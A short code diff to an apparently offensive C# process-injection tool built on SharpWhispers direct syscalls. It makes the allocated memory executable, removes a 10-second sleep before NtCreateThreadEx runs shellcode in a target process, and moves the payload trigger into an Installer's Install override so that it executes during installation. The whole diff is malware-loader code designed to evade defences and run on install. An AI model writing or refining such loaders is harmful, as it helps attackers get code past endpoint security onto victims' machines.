@@ -12,6 +12,7 @@ using System.Configuration.Install;
 
 using Data = SharpWhispers.Data;
 using Syscall = Syscalls.Syscalls;
+using System.Collections;
 
 namespace BasicProcessInjection
 {
@@ -160,7 +161,7 @@ namespace BasicProcessInjection
             AllocationSize = ShellcodeSize;
             IntPtr ProtectAddress = BaseAddress;
             Syscall.NtProtectVirtualMemory(HProc, ref ProtectAddress, ref AllocationSize, Data.Win32.WinNT.PAGE_EXECUTE_READ);
-            Thread.Sleep(10000);
+            //Thread.Sleep(10000);
 
             IntPtr HThread = IntPtr.Zero;
             res = (uint)Syscall.NtCreateThreadEx(ref HThread, Data.Win32.WinNT.ACCESS_MASK.GENERIC_ALL, (IntPtr)0, HProc, BaseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
@@ -181,9 +182,9 @@ namespace BasicProcessInjection
     [System.ComponentModel.RunInstaller(true)]
     public class MyInstaller : Installer
     {
-        public override void Uninstall(System.Collections.IDictionary savedState)
+        public override void Install(IDictionary stateSaver)
         {
-            base.Uninstall(savedState);
+            base.Install(stateSaver);
             //Class1.print();
             Program.Run();
             // Do your thing...
